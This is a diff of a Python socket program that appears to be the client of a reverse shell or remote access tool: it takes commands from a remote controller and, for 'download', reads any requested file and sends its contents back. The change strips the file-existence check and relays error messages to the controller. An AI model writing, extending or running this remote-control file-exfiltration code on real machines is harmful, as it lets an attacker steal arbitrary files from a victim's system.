@@ -1,7 +1,6 @@
 import socket as st
 import os,shutil
-from colorama import Fore, Style
-
+# from colorama import Fore, Style
 
 def main():
     sock = st.socket(st.AF_INET, st.SOCK_STREAM)
@@ -49,14 +48,22 @@ def main():
                     sock.send(b"Error: File not found\n")
 
             elif get_cmd.startswith('download '):  
-                dfile = get_cmd.split()[1]
-                if os.path.isfile(dfile):
-                    with open(dfile, 'rb') as file:
-                        while chnk := file.read():
-                            sock.sendall(chnk)
-    
-                else:
-                    sock.send(b'Error: File does not exist\n')
+                try:
+                    dfile = get_cmd.split()[1]
+                    # if os.path.isfile(dfile):
+                    file = open(dfile,'rb')
+                    data = file.read()
+                    # print(file)
+                    if not data:
+                        sock.send('File is empty!'.encode())
+                        file.close()
+                        continue
+                    else:
+                        sock.sendall(data)
+                    # else:
+                    #     sock.send('{} is not a file'.format(dfile).encode())
+                except Exception as e:
+                    sock.send(str(e).encode())
 
             elif get_cmd in ('pwd', 'cwd'):  
                 sock.send(os.getcwd().encode() + b"\n")
